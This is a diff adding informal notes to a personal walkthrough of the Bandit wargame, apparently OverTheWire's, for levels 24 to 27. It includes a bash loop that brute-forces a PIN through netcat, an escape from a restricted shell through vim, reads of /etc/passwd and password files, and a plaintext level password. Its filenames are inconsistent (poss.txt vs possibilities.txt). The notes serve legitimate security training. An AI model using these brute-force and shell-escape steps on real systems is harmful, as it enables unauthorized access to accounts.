@@ -180,4 +180,35 @@ cp script.sh /var/spool/bandit24/foo/
 cat password
 wait for a minute to print out the password (idk why but i wasn't getting the password but when i executed the script it said no permission, so the script is alright but idk if there is something else that is wrong, also: try changing permissions of the temp directory so that everybody can write to it
 
+level24
+we have to try all possibilities from 0000 to 9999 to get the password of the next level
+for this we'll write a script that combines bandit24's pwd and the code with a space in btw and save it to a file
+then cat the file and pipe it to nc
+the following is the script:
+current_pwd="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
+for i in {0000..9999}
+do
+        echo "$current_pwd $i" >> poss.txt
+done
+the command:
+cat possibilities.txt | nc localhost 30002
+
+level25 and 26
+this is a little tricky, first let's print out the shell that bandit26 is using by cat /etc/passwd and grep bandit26
+it says /usr/bin/showtext
+cat /usr/bin/showtext
+it uses the more command
+use ssh to log in to bandit26 with the ssh private key
+we have to resize the window before running so that the more command triggers
+then type v to open vim
+once vim is opened, you can resize the window, use :shell to open a shell but it isnt working
+so we have to set the shell by
+:set shell=/bin/bash
+and then open the shell by :shell
+now print the passwd of bandit26: cat /etc/bandit_pass/bandit26
+we see a setuid binary
+use it
+get the password of bandit27: cat /etc/bandit_pass/bandit27
+
+level27
 
